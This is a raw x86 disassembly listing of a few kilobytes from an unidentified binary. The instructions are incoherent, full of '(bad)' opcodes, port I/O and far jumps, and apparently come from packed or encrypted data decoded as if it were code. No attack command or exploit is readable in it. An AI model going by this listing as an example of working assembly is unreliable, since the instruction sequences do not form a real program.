  414945:	lods   eax,DWORD PTR ds:[esi]
  414946:	inc    eax
  414947:	fcomp  QWORD PTR [ebp+eiz*4-0x3a]
  41494b:	loope  0x41495b
  41494d:	rol    BYTE PTR [edi-0x51],cl
  414950:	push   0x30
  414952:	aam    0x67
  414954:	pop    ebx
  414955:	and    al,0xc3
  414957:	pop    eax
  414958:	mov    ch,al
  41495a:	jnp    0x4148f7
  41495c:	lods   eax,DWORD PTR ds:[esi]
  41495d:	ja     0x4149de
  41495f:	xchg   ecx,eax
  414960:	xchg   BYTE PTR [ecx],bh
  414962:	push   ebx
  414963:	in     eax,dx
  414964:	xchg   edi,eax
  414965:	(bad)  
  414967:	mov    al,BYTE PTR [edx+0x625d43c7]
  41496d:	retf   
  41496e:	js     0x4149cd
  414970:	mov    al,0xa5
  414972:	iret   
  414973:	mov    edx,0x50f2fc53
  414978:	jge    0x414907
  41497a:	jg     0x4149d4
  41497c:	imul   edx,DWORD PTR [esi+eax*2+0x769eeba9],0x643da77b
  414987:	push   0xdf39cee8
  41498c:	fiadd  WORD PTR [ebx-0x11148601]
  414992:	dec    edx
  414993:	aad    0x84
  414995:	xor    al,0x83
  414997:	shl    BYTE PTR [edi+0x6124629f],cl
  41499d:	mov    cl,0x66
  41499f:	add    BYTE PTR [esi+ecx*8+0x1],bl
  4149a3:	stos   DWORD PTR es:[edi],eax
  4149a4:	mov    es,WORD PTR [ebp-0x41]
  4149a7:	es mov bl,0xd9
  4149aa:	test   DWORD PTR ds:0x5af89d1d,0xa0252f34
  4149b4:	aaa    
  4149b5:	shl    DWORD PTR [esi-0x782e0e75],cl
  4149bb:	outs   dx,DWORD PTR ds:[esi]
  4149bc:	retf   0xd2dd
  4149bf:	ror    DWORD PTR [edi+0x1],0xf5
  4149c3:	xchg   DWORD PTR [esi+ebp*2-0x4b],ebp
  4149c7:	mov    ds:0xad22fb10,al
  4149cc:	cs ins BYTE PTR es:[edi],dx
  4149ce:	adc    edx,ebp
  4149d0:	clc    
  4149d1:	xchg   ebp,eax
  4149d2:	lods   al,BYTE PTR ds:[esi]
  4149d3:	push   0xdc20fec2
  4149d8:	pushw  ss
  4149da:	mov    ah,0xbb
  4149dc:	and    ch,BYTE PTR [eax+0x55]
  4149df:	xor    ecx,DWORD PTR [esi+edi*4-0x5354379e]
  4149e6:	(bad)  
  4149e7:	mov    ecx,0x740a75d0
  4149ec:	(bad)  
  4149ed:	sbb    BYTE PTR [ecx-0x64],dh
  4149f0:	int    0xad
  4149f2:	jo     0x414a61
  4149f4:	les    edx,FWORD PTR [eax-0x3d]
  4149f7:	xor    cx,bx
  4149fa:	retf   0xfbd1
  4149fd:	xlat   BYTE PTR ds:[ebx]
  4149fe:	pop    ecx
  4149ff:	mov    dl,0x13
  414a01:	addr16 and al,0x2b
  414a04:	jge    0x41498f
  414a06:	push   eax
  414a07:	out    dx,eax
  414a08:	fidivr WORD PTR [eax+0x17edc678]
  414a0e:	arpl   WORD PTR [esi+0x53],cx
  414a11:	mov    bl,0x53
  414a13:	repnz inc edi
  414a15:	xchg   ch,al
  414a17:	mov    ebp,0x638bf1b4
  414a1c:	stos   BYTE PTR es:[edi],al
  414a1d:	stos   BYTE PTR es:[edi],al
  414a1e:	in     al,0x88
  414a20:	int3   
  414a21:	mov    esp,0x3084d3be
  414a26:	push   cs
  414a27:	stos   BYTE PTR es:[edi],al
  414a28:	mov    bh,0xad
  414a2a:	push   ebp
  414a2b:	push   eax
  414a2c:	pop    esp
  414a2d:	xor    eax,0x516e31aa
  414a32:	inc    ebx
  414a33:	aam    0xc2
  414a35:	loop   0x4149e0
  414a37:	es js  0x4149e6
  414a3a:	pop    edi
  414a3b:	xchg   ebx,eax
  414a3c:	fbstp  TBYTE PTR [edx]
  414a3e:	data16 mov al,ds:0x4be8700e
  414a44:	fs push esp
  414a46:	mov    edi,0x51dd5c60
  414a4b:	mov    ebx,0x5079eee6
  414a50:	data16 cli 
  414a52:	loopne 0x414ad0
  414a54:	jmp    0x414a55
  414a56:	ja     0x414ad0
  414a58:	pusha  
  414a59:	mov    dl,0xa0
  414a5b:	inc    ecx
  414a5c:	xchg   esp,eax
  414a5d:	fmul   QWORD PTR [ebx+0x30723cfd]
  414a63:	jno    0x414ad4
  414a65:	fild   QWORD PTR [eax]
  414a67:	add    DWORD PTR [edx-0x6e],0xd
  414a6b:	lahf   
  414a6c:	ret    0x657a
  414a6f:	xor    dl,cl
  414a71:	fs pmovmskb edi,mm5
  414a75:	ja     0x414a02
  414a77:	pusha  
  414a78:	inc    cx
  414a7a:	nop
  414a7b:	pop    eax
  414a7c:	nop
  414a7d:	push   ecx
  414a7e:	xchg   esi,eax
  414a7f:	popf   
  414a80:	sbb    al,BYTE PTR [ecx-0x1c07346e]
  414a86:	in     al,dx
  414a87:	mov    ecx,0x49cbc22f
  414a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a8d:	lods   al,BYTE PTR ds:[esi]
  414a8e:	pop    ds
  414a8f:	les    eax,FWORD PTR [ebx+0x8]
  414a92:	push   ebx
  414a93:	dec    ebp
  414a94:	cdq    
  414a95:	test   DWORD PTR [eax+0x6c],eax
  414a98:	shl    ebx,cl
  414a9a:	dec    ecx
  414a9b:	fmul   QWORD PTR [eax+0x49]
  414a9e:	lea    edi,[eax-0x25]
  414aa1:	dec    ebp
  414aa2:	dec    eax
  414aa3:	lahf   
  414aa4:	and    cl,al
  414aa6:	imul   eax,DWORD PTR [ecx+0x6202e2cf],0x3d
  414aad:	stos   DWORD PTR es:[edi],eax
  414aae:	popa   
  414aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ab0:	cmp    eax,0xd2b2de97
  414ab5:	es and esi,esi
  414ab8:	sub    eax,DWORD PTR [ecx+edi*1+0x46]
  414abc:	cmp    ah,BYTE PTR [eax+0x75]
  414abf:	out    0x58,eax
  414ac1:	pop    edi
  414ac2:	mov    ds:0x18be4dc9,al
  414ac7:	mov    BYTE PTR [ecx+0xe93bc19],ah
  414acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ace:	fsub   QWORD PTR [esi+0x6ee7b095]
  414ad4:	or     al,0xee
  414ad6:	stos   DWORD PTR es:[edi],eax
  414ad7:	push   ebp
  414ad8:	push   esp
  414ad9:	js     0x414b0b
  414adb:	cmp    al,0xe3
  414add:	je     0x414aa7
  414adf:	hlt    
  414ae0:	mov    ebx,0xa2f3f54f
  414ae5:	add    ch,BYTE PTR [ebx-0x7a727379]
  414aeb:	mov    cl,0x84
  414aed:	inc    edx
  414aee:	in     eax,0x9f
  414af0:	imul   ecx,DWORD PTR [ebp-0x51777029],0xffffffbd
  414af7:	cmp    BYTE PTR [ebp-0x16f3d7d7],ah
  414afd:	les    esp,FWORD PTR [esi+0x6f]
  414b00:	mov    bh,0xff
  414b02:	enter  0xbd0,0xc8
  414b06:	bound  edi,QWORD PTR [eax+0x47]
  414b09:	adc    esi,DWORD PTR [edx-0x100cf904]
  414b0f:	push   esi
  414b10:	pop    edx
  414b11:	dec    edi
  414b12:	mov    ?,WORD PTR [esi+ebx*2]
  414b15:	data16 xor cl,dl
  414b18:	clc    
  414b19:	push   ds
  414b1a:	(bad)  
  414b1c:	scas   al,BYTE PTR es:[edi]
  414b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b1e:	and    al,0xa0
  414b20:	jp     0x414b06
  414b22:	pop    ebp
  414b23:	xchg   BYTE PTR [edx],al
  414b25:	mov    al,ds:0xc3fddf24
  414b2a:	sub    DWORD PTR [eax],edx
  414b2c:	stos   DWORD PTR es:[edi],eax
  414b2d:	dec    ebp
  414b2e:	sbb    dh,bh
  414b30:	adc    DWORD PTR [eax+0x74f3966d],edx
  414b36:	mov    BYTE PTR [ecx+0x72],dl
  414b39:	das    
  414b3a:	cdq    
  414b3b:	inc    ebx
  414b3c:	mov    ebp,DWORD PTR [ecx]
  414b3e:	mov    esi,edx
  414b40:	call   0xcff6:0x71008059
  414b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b48:	loop   0x414b7b
  414b4a:	jns    0x414baa
  414b4c:	ret    
  414b4d:	mov    ds:0xeabce1bf,al
  414b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b53:	mov    esi,0xc4f9520d
  414b58:	test   al,0xc5
  414b5a:	jae    0x414b82
  414b5c:	cmp    BYTE PTR [esi],bh
  414b5e:	ds dec edx
  414b60:	or     bp,WORD PTR [ebx+0x9]
  414b64:	xchg   esp,eax
  414b65:	add    al,0x39
  414b67:	add    eax,0xffffff84
  414b6a:	int3   
  414b6b:	cmp    al,0xd7
  414b6d:	or     ebx,DWORD PTR [edi+0x10]
  414b70:	pop    esi
  414b71:	push   eax
  414b72:	inc    ecx
  414b73:	sub    edx,DWORD PTR [edx+eax*8+0x22c1d48e]
  414b7a:	cmp    dl,0x71
  414b7d:	test   DWORD PTR [edx*4+0x7d9275b],edx
  414b84:	mov    ah,BYTE PTR [eax+0x76c19c9c]
  414b8a:	push   edx
  414b8b:	sbb    DWORD PTR [esi+0x76],esi
  414b8e:	pop    edx
  414b8f:	mul    BYTE PTR [eax]
  414b91:	in     eax,0x3
  414b93:	push   ebp
  414b94:	jmp    0x122bdbd7
  414b99:	or     edx,DWORD PTR [ecx-0x9]
  414b9c:	ss sbb eax,0xe455da6f
  414ba2:	je     0x414b91
  414ba4:	icebp  
  414ba5:	jns    0x414b2f
  414ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba8:	xor    bl,BYTE PTR [eax+0x64efd137]
  414bae:	ret    0x6bbb
  414bb1:	mov    bl,0xf5
  414bb3:	pop    ss
  414bb4:	out    dx,eax
  414bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb6:	cld    
  414bb7:	push   cs
  414bb8:	adc    al,0x4b
  414bba:	out    dx,al
  414bbb:	sub    ecx,esi
  414bbd:	push   eax
  414bbe:	imul   edi,DWORD PTR [ebp+0x72a8b9e0],0x96dbb52
  414bc8:	mov    edx,0x6ddf451e
  414bcd:	das    
  414bce:	inc    esp
  414bcf:	jnp    0x414c00
  414bd1:	sar    BYTE PTR [ecx],0x59
  414bd4:	and    ecx,DWORD PTR [eax-0x758dd50f]
  414bda:	jge    0x414bf4
  414bdc:	inc    ecx
  414bdd:	popa   
  414bde:	add    ebx,edi
  414be0:	int    0xe3
  414be2:	mov    dh,0xf2
  414be4:	push   ebp
  414be5:	adc    BYTE PTR [ebx-0x2d],al
  414be8:	test   DWORD PTR [edi],edx
  414bea:	(bad)  
  414bec:	pop    edx
  414bed:	sbb    esi,DWORD PTR ss:[esi+ebx*2+0x22]
  414bf2:	or     eax,0xf51a011
  414bf7:	dec    esi
  414bf8:	cmp    dh,BYTE PTR [edx+0x177d14dc]
  414bfe:	scas   eax,DWORD PTR es:[edi]
  414bff:	jno    0x414b99
  414c01:	je     0x414c67
  414c03:	push   cs
  414c04:	test   BYTE PTR [esi],bl
  414c06:	push   edx
  414c07:	inc    ebx
  414c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c09:	adc    eax,0x5b0b0df6
  414c0e:	push   edx
  414c0f:	repz mov ecx,0x7bc2cc08
  414c15:	into   
  414c16:	mov    eax,0x7ff9fea3
  414c1b:	enter  0x79e1,0xe7
  414c1f:	inc    esp
  414c21:	mov    al,ds:0x1df17724
  414c26:	les    edx,FWORD PTR cs:[ebx]
  414c29:	pop    esi
  414c2a:	shl    BYTE PTR [eax-0x54],cl
  414c2d:	push   ss
  414c2e:	enter  0xe903,0xf1
  414c32:	push   cs
  414c33:	inc    ecx
  414c34:	lds    ecx,FWORD PTR [edx+esi*8+0x4]
  414c38:	js     0x414bbe
  414c3a:	das    
  414c3b:	outs   dx,BYTE PTR ds:[esi]
  414c3c:	dec    ebx
  414c3d:	xor    BYTE PTR [eax],dl
  414c3f:	jp     0x414bd6
  414c41:	pop    esp
  414c42:	jno    0x414be8
  414c44:	mov    al,ds:0xf826ad64
  414c49:	pop    edi
  414c4a:	cmp    dl,BYTE PTR [ebp+0x62]
  414c4d:	in     eax,dx
  414c4e:	adc    BYTE PTR [ecx-0x57],0xec
  414c52:	add    DWORD PTR [ebp-0x61],ecx
  414c55:	sbb    edi,esp
  414c57:	inc    eax
  414c58:	mov    ch,0x35
  414c5a:	leave  
  414c5b:	cmp    DWORD PTR [ebx+0xae5b7dd],0x354e4ba8
  414c65:	pusha  
  414c66:	pop    ebx
  414c67:	lods   eax,DWORD PTR ds:[esi]
  414c68:	cmc    
  414c69:	addr16 add al,0x93
  414c6c:	push   0x22a416c8
  414c71:	rol    edi,0x2d
  414c74:	cld    
  414c75:	ret    
  414c76:	mov    ah,0xb9
  414c78:	jae    0x414cd3
  414c7a:	mov    esp,0xfe052628
  414c7f:	push   0xaf7967a3
  414c84:	xor    al,0x8b
  414c86:	jbe    0x414c0b
  414c88:	fmul   QWORD PTR ds:[ecx+0x6d]
  414c8c:	xchg   edi,eax
  414c8d:	adc    ah,0x7d
  414c90:	mov    ds:0x6211a502,eax
  414c95:	scas   al,BYTE PTR es:[edi]
  414c96:	jb     0x414ca7
  414c98:	retf   
  414c99:	and    DWORD PTR [edi-0x1b11f185],edx
  414c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca0:	ja     0x414ce9
  414ca2:	pop    ecx
  414ca3:	pop    es
  414ca4:	daa    
  414ca5:	add    eax,0x65402f2b
  414caa:	fistp  QWORD PTR [ebx]
  414cac:	push   0xffffffb7
  414cae:	pushf  
  414caf:	jg     0x414c60
  414cb1:	imul   DWORD PTR [ebx+edx*1]
  414cb4:	bnd jge 0x414c9e
  414cb7:	add    ah,bh
  414cb9:	sar    DWORD PTR [ebp-0x5a9af326],cl
  414cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cc0:	test   al,dh
  414cc2:	push   esi
  414cc3:	mov    ebp,0x7d8e47b6
  414cc8:	adc    BYTE PTR [edx-0x150888d5],0x94
  414ccf:	gs es pushf 
  414cd2:	(bad)  
  414cd3:	cmp    al,0x4b
  414cd5:	leave  
  414cd6:	add    al,0x86
  414cd8:	shl    BYTE PTR [ebp-0x78eec3ba],cl
  414cde:	and    esp,eax
  414ce0:	pushf  
  414ce1:	adc    BYTE PTR [ecx],cl
  414ce3:	dec    esp
  414ce4:	shl    BYTE PTR [edx],cl
  414ce6:	daa    
  414ce7:	imul   ebx,DWORD PTR [ebx-0x32748696],0x5c
  414cee:	sahf   
  414cef:	lea    ecx,[edi+0x4d]
  414cf2:	popa   
  414cf3:	aaa    
  414cf4:	mov    ecx,0x39251f62
  414cf9:	sbb    esi,DWORD PTR [ebx+0x6d73bc3b]
  414cff:	pop    es
  414d00:	add    BYTE PTR [esi+0x26],bh
  414d03:	outs   dx,DWORD PTR ds:[esi]
  414d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d05:	xlat   BYTE PTR ds:[ebx]
  414d06:	mov    ebp,0x5a46d7b0
  414d0b:	push   es
  414d0c:	add    al,BYTE PTR [ecx-0x66aa9e46]
  414d12:	pop    ds
  414d13:	shr    dh,1
  414d15:	push   0xd859f4e0
  414d1a:	ins    DWORD PTR es:[edi],dx
  414d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d1c:	out    dx,eax
  414d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d1e:	in     eax,0x5
  414d20:	lock or eax,0x8bb732de
  414d26:	pop    esp
  414d27:	inc    ecx
  414d28:	cmp    dl,BYTE PTR [ecx]
  414d2a:	sub    ebp,DWORD PTR [esi+edx*2]
  414d2d:	xchg   ebx,eax
  414d2e:	push   ebx
  414d2f:	pop    ds
  414d30:	lahf   
  414d31:	pop    ebp
  414d32:	outs   dx,BYTE PTR ds:[esi]
  414d33:	scas   al,BYTE PTR es:[edi]
  414d34:	in     al,dx
  414d35:	(bad)  
  414d38:	popf   
  414d39:	jnp    0x414d8e
  414d3b:	test   eax,0x342d7088
  414d40:	mov    cl,ch
  414d42:	push   ebx
  414d43:	imul   sp,WORD PTR [esi],0xffe6
  414d47:	mov    dh,BYTE PTR es:[ebp-0x79]
  414d4b:	dec    ecx
  414d4c:	mov    al,ds:0xd879cfea
  414d51:	xor    edi,DWORD PTR [edi+0x776ac3d7]
  414d57:	inc    ecx
  414d58:	inc    eax
  414d59:	loope  0x414d9d
  414d5b:	inc    esi
  414d5c:	adc    eax,0x5ced33ec
  414d61:	enter  0xcdf2,0xbe
  414d65:	mov    ebp,DWORD PTR [ecx-0x1c4c7b9c]
  414d6b:	fild   DWORD PTR [edx+0x2307248d]
  414d71:	int    0xf7
  414d73:	test   al,0x55
  414d75:	into   
  414d76:	or     DWORD PTR [ecx+ecx*4],ebx
  414d79:	out    0xd2,al
  414d7b:	pop    ds
  414d7c:	loopne 0x414d11
  414d7e:	lock lods eax,DWORD PTR ds:[esi]
  414d80:	inc    eax
  414d81:	jnp    0x414d4f
  414d83:	add    BYTE PTR [esi+0x24],bh
  414d86:	in     al,0x3e
  414d88:	pusha  
  414d89:	sbb    eax,0xcc999731
  414d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d8f:	retf   
  414d90:	pop    ebp
  414d91:	les    ecx,FWORD PTR [ecx+edi*2-0x49b7f38d]
  414d98:	mov    dl,0x7a
  414d9a:	nop
  414d9b:	fwait
  414d9c:	lea    esi,[edi+0x5b735b67]
  414da2:	add    esi,ecx
  414da4:	jmp    0x414d8c
  414da6:	jae    0x414d7e
  414da8:	fsub   QWORD PTR [ebx+0x10]
  414dab:	or     al,0xfd
  414dad:	mov    al,0xb0
  414daf:	xor    al,0x6
  414db1:	jge    0x414d4a
  414db3:	cwde   
  414db4:	xlat   BYTE PTR ds:[ebx]
  414db5:	pop    ebx
  414db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db7:	shl    al,cl
  414db9:	jecxz  0x414e09
  414dbb:	dec    edi
  414dbc:	mov    esp,0x3ad6e0d
  414dc1:	mov    eax,0x56178c71
  414dc6:	lock push cs
  414dc8:	popf   
  414dc9:	loopne 0x414e17
  414dcb:	add    esp,DWORD PTR [esp+edx*2]
  414dce:	hlt    
  414dcf:	pop    ecx
  414dd0:	inc    esp
  414dd1:	in     eax,0xe8
  414dd3:	in     al,dx
  414dd4:	xor    BYTE PTR [ebx-0x30e5f30f],bl
  414dda:	lds    ebx,FWORD PTR [ecx]
  414ddc:	out    dx,eax
  414ddd:	push   ss
  414dde:	pop    ebp
  414ddf:	jmp    0xf5923de1
  414de4:	dec    bh
  414de6:	push   0xa
  414de8:	sub    al,0xf1
  414dea:	adc    BYTE PTR [edx-0x6d],bh
  414ded:	push   esp
  414dee:	jle    0x414deb
  414df0:	sbb    DWORD PTR [esi-0x1afade46],esp
  414df6:	jp     0x414de1
  414df8:	pop    ecx
  414df9:	xchg   edi,eax
  414dfa:	mov    eax,0x2a6460aa
  414dff:	mov    bh,0x5a
  414e01:	inc    ebx
  414e02:	mov    esp,0xac6d1141
  414e07:	rcl    DWORD PTR [ecx],1
  414e09:	jle    0x414e25
  414e0b:	mov    ch,bh
  414e0d:	inc    edx
  414e0e:	and    DWORD PTR [esi+0x48],ebp
  414e11:	fwait
  414e12:	cli    
  414e13:	aaa    
  414e14:	shl    BYTE PTR [edx-0x5d5c7550],cl
  414e1a:	stc    
  414e1b:	out    dx,eax
  414e1c:	call   0xf79760d3
  414e21:	(bad)  
  414e22:	iret   
  414e23:	inc    ebx
  414e24:	int3   
  414e25:	fist   DWORD PTR [edx+edx*8]
  414e28:	xchg   esi,eax
  414e29:	or     al,dl
  414e2b:	ret    0x3269
  414e2e:	pop    edi
  414e2f:	jbe    0x414e08
  414e31:	dec    ebx
  414e32:	cmp    bh,0xc1
  414e35:	je     0x414e22
  414e37:	pcmpeqd mm2,QWORD PTR [ecx]
  414e3a:	in     eax,dx
  414e3b:	outs   dx,DWORD PTR ds:[esi]
  414e3c:	fld    DWORD PTR [eax-0xb53b1f2]
  414e42:	cdq    
  414e43:	pop    edx
  414e44:	xlat   BYTE PTR ds:[ebx]
  414e45:	xchg   edi,eax
  414e46:	(bad)  
  414e47:	jp     0x414e40
  414e49:	cwde   
  414e4a:	sbb    bl,BYTE PTR [edi+ecx*2+0x570929ce]
  414e51:	hlt    
  414e52:	push   edi
  414e53:	bound  ebp,QWORD PTR [ebx]
  414e55:	mov    cl,0xe2
  414e57:	aas    
  414e58:	inc    esp
  414e59:	ror    BYTE PTR [ecx],1
  414e5b:	mov    esi,DWORD PTR [ebx+esi*8+0x4b]
  414e5f:	loope  0x414e9f
  414e61:	or     eax,DWORD PTR [esi]
  414e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e64:	aam    0x8b
  414e66:	sbb    eax,esp
  414e68:	pop    esp
  414e69:	lods   al,BYTE PTR ds:[esi]
  414e6a:	aaa    
  414e6b:	xchg   esi,eax
  414e6c:	aad    0x13
  414e6e:	int3   
  414e6f:	mov    dh,0x87
  414e71:	test   al,0xd0
  414e73:	mov    al,0xbf
  414e75:	fnstsw WORD PTR [edx-0x61]
  414e78:	mov    edx,0x8ccd2e39
  414e7d:	inc    ebx
  414e7e:	mov    ch,BYTE PTR [esi+0x70b89e1c]
  414e84:	es in  eax,0x97
  414e87:	add    ecx,esp
  414e89:	out    dx,al
  414e8a:	in     al,0x1e
  414e8c:	dec    esi
  414e8d:	cmp    eax,0xcef714a9
  414e92:	cmp    eax,0x38582565
  414e97:	sbb    dh,BYTE PTR [esi]
  414e99:	jl     0x414e92
  414e9b:	ficom  WORD PTR [ecx-0x15179232]
  414ea1:	push   ecx
  414ea2:	or     ch,ch
  414ea4:	outs   dx,DWORD PTR ds:[esi]
  414ea5:	dec    dl
  414ea7:	jmp    0x4d66763
  414eac:	add    BYTE PTR [edx],0x11
  414eaf:	stos   DWORD PTR es:[edi],eax
  414eb0:	addr16 pushf 
  414eb2:	(bad)  
  414eb3:	ss in  eax,0xbc
  414eb6:	clc    
  414eb7:	aas    
  414eb8:	jb     0x414edd
  414eba:	push   edx
  414ebb:	dec    esp
  414ebc:	ins    DWORD PTR es:[edi],dx
  414ebd:	sub    al,0x38
  414ebf:	shl    BYTE PTR [ebx+0x724d9ed1],cl
  414ec5:	mov    dh,BYTE PTR [ebp-0x30]
  414ec8:	mov    esi,0x17cf2e12
  414ecd:	std    
  414ece:	data16 mov dl,0x71
  414ed1:	mov    cl,0x43
  414ed3:	xlat   BYTE PTR ds:[ebx]
  414ed4:	rol    bh,cl
  414ed6:	repz mov ebp,0x51a53e5
  414edc:	xor    DWORD PTR [ebx-0x3d],0x6dc58388
  414ee3:	xchg   esi,eax
  414ee4:	push   0x1669c4ec
  414ee9:	mov    dh,0x3a
  414eeb:	lock pop es
  414eed:	xchg   eax,edi
  414eef:	mov    ecx,0x52abf86b
  414ef4:	add    DWORD PTR [edi],esp
  414ef6:	idiv   BYTE PTR [edi+0x7a484675]
  414efc:	adc    eax,0x5bfc70d4
  414f01:	inc    esi
  414f02:	sbb    ebx,DWORD PTR [edi+0x65]
  414f05:	xor    dh,BYTE PTR [esp+ecx*4+0x12a480a0]
  414f0c:	pop    ecx
  414f0d:	adc    eax,0xab609d5f
  414f12:	mov    WORD PTR [ecx+0xf],?
  414f15:	pop    edi
  414f16:	or     DWORD PTR [eax+0x67f9a59f],esi
  414f1c:	cmp    ebp,DWORD PTR [eax]
  414f1e:	adc    al,0x38
  414f20:	cmp    BYTE PTR [ebp-0x3c2cdb92],ch
  414f26:	nop
  414f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f28:	ja     0x414ed0
  414f2a:	and    DWORD PTR [edi],esp
  414f2c:	pop    esi
  414f2d:	aad    0x69
  414f2f:	adc    al,BYTE PTR [ecx]
  414f31:	mov    ecx,0x5f7acfd5
  414f36:	inc    ebx
  414f37:	push   ebx
  414f38:	lods   al,BYTE PTR ds:[esi]
  414f39:	(bad)  
  414f3a:	retf   0xd41
  414f3d:	fisttp QWORD PTR [ebx-0x73a91309]
  414f43:	mov    ecx,0x702f6021
  414f48:	xlat   BYTE PTR ds:[ebx]
  414f49:	fnstenv [eax+0x6]
  414f4c:	jae    0x414f33
  414f4e:	mov    DWORD PTR [ebx-0x1f],ebp
  414f51:	mov    esp,0x8c8bb0c4
  414f56:	in     al,0xf3
  414f58:	sub    al,BYTE PTR [ebx-0x16eab2ef]
  414f5e:	gs pop ecx
  414f60:	dec    esi
  414f61:	pop    esp
  414f62:	cmp    BYTE PTR [ecx],ch
  414f64:	daa    
  414f65:	adc    eax,0x8a5b2a50
  414f6a:	mov    ds:0x9e62a185,al
  414f6f:	jns    0x414fc0
  414f71:	mov    ecx,0xfc059265
  414f76:	mov    eax,0x3a72baa9
  414f7b:	mov    ch,0x10
  414f7d:	fadd   st(3),st
  414f7f:	ss jg  0x414fc9
  414f82:	pop    es
  414f83:	(bad)  
  414f84:	jl     0x414f41
  414f86:	jne    0x414f39
  414f88:	out    dx,al
  414f89:	(bad)  
  414f8b:	mov    bh,0x2b
  414f8d:	aad    0xe3
  414f8f:	shl    DWORD PTR [esi-0x1],cl
  414f92:	sbb    DWORD PTR [edi],eax
  414f94:	shl    DWORD PTR [ebx+0x17],0x6d
  414f98:	xchg   ebp,eax
  414f99:	sub    al,0xe4
  414f9b:	push   es
  414f9c:	test   DWORD PTR [ecx],eax
  414f9e:	stos   BYTE PTR es:[edi],al
  414f9f:	dec    esi
  414fa0:	cmp    BYTE PTR [esi-0xd],cl
  414fa3:	rcr    BYTE PTR [eax+0x59c29399],0xf3
  414faa:	add    al,0x55
  414fac:	pop    ebx
  414fad:	inc    eax
  414fae:	inc    ecx
  414faf:	int3   
  414fb0:	xor    ecx,eax
  414fb2:	out    0xa5,al
  414fb4:	int    0x8e
  414fb6:	pop    edx
  414fb7:	xchg   esp,eax
  414fb8:	fmul   st,st(2)
  414fba:	int    0xa
  414fbc:	inc    esi
  414fbd:	push   cs
  414fbe:	sub    eax,0xeee6da43
  414fc3:	scas   eax,DWORD PTR es:[edi]
  414fc4:	int3   
  414fc5:	pop    es
  414fc6:	xchg   ebp,eax
  414fc7:	sub    al,BYTE PTR ds:0xdff32148
  414fcd:	jbe    0x414f4f
  414fcf:	mov    WORD PTR [ebx+0x46],?
  414fd2:	xor    ebp,esp
  414fd4:	loopne 0x41501b
  414fd6:	loope  0x414f93
  414fd8:	or     dl,BYTE PTR [ebx-0x9561379]
  414fde:	aaa    
  414fdf:	pushf  
  414fe0:	mov    bl,0xc3
  414fe2:	sub    esi,esp
  414fe4:	ins    BYTE PTR es:[edi],dx
  414fe5:	jp     0x414fae
  414fe7:	and    eax,0x53936f5f
  414fec:	sub    esi,DWORD PTR [eax+0x536ad408]
  414ff2:	lods   eax,DWORD PTR ds:[esi]
  414ff3:	adc    esp,DWORD PTR [eax+0x16]
  414ff6:	pop    DWORD PTR [ebx]
  414ff8:	add    al,BYTE PTR [edi-0x60]
  414ffb:	lods   eax,DWORD PTR ds:[esi]
  414ffc:	fsub   DWORD PTR ds:0x21c26a7e
  415002:	fst    QWORD PTR [esi-0x624da39]
  415008:	repz push ds
  41500a:	xor    ah,ch
  41500c:	sub    edi,DWORD PTR [ebx+edx*1-0x6ab78640]
  415013:	scas   al,BYTE PTR es:[edi]
  415014:	shl    DWORD PTR [ecx+0x50],cl
  415017:	sub    ebx,DWORD PTR [ecx]
  415019:	pop    edi
  41501a:	add    eax,0xc511d742
  41501f:	cdq    
  415020:	ss push es
  415022:	dec    esi
  415023:	int3   
  415024:	retf   0xecd
  415027:	mov    al,bl
  415029:	fwait
  41502a:	add    bh,ch
  41502c:	call   0xac52:0xfddb88c5
  415033:	sbb    eax,0x32003f55
  415038:	pop    ss
  415039:	cmp    DWORD PTR [ebx+0x7efa033b],ebp
  41503f:	cmc    
  415040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415041:	bnd jb 0x415048
  415044:	adc    al,0x18
  415046:	xchg   ebp,eax
  415047:	pop    ebx
  415048:	lods   eax,DWORD PTR ds:[esi]
  415049:	mov    edi,0x307c5ef5
  41504e:	sahf   
  41504f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415050:	fwait
  415051:	lock retf 
  415053:	out    0x22,al
  415055:	and    BYTE PTR [eax-0x316b73fb],dh
  41505b:	inc    ebp
  41505c:	retf   
  41505d:	sahf   
  41505e:	push   ebx
  41505f:	lods   eax,DWORD PTR ds:[esi]
  415060:	js     0x4150c4
  415062:	retf   
  415063:	sub    DWORD PTR [ebx-0x2a],edx
  415066:	sbb    ebx,DWORD PTR [edx]
  415068:	cmp    esi,DWORD PTR [edx-0x4ee91268]
  41506e:	jp     0x4150a2
  415070:	push   ss
  415071:	push   edi
  415072:	mov    eax,ds:0x8b55a0cd
  415077:	jne    0x4150b9
  415079:	dec    edi
  41507a:	xor    BYTE PTR [ebx+0x1ac6b78e],bl
  415080:	sbb    al,0x2
  415082:	daa    
  415083:	repz and DWORD PTR [ebx+0x26],ecx
  415087:	jne    0x415107
  415089:	scas   al,BYTE PTR es:[edi]
  41508a:	inc    ebp
  41508b:	dec    ecx
  41508c:	je     0x415023
  41508e:	bound  ebp,QWORD PTR [ebx+0x54]
  415091:	dec    eax
  415092:	mov    eax,ds:0x11f7742e
  415097:	ror    BYTE PTR [edx+0x26],1
  41509a:	repz mov ss,WORD PTR [esi+0x288a3f53]
  4150a1:	dec    esi
  4150a2:	dec    ecx
  4150a3:	sbb    DWORD PTR [eax-0x80],ebp
  4150a6:	ss xor ah,cl
  4150a9:	jmp    0x4010:0x73770c68
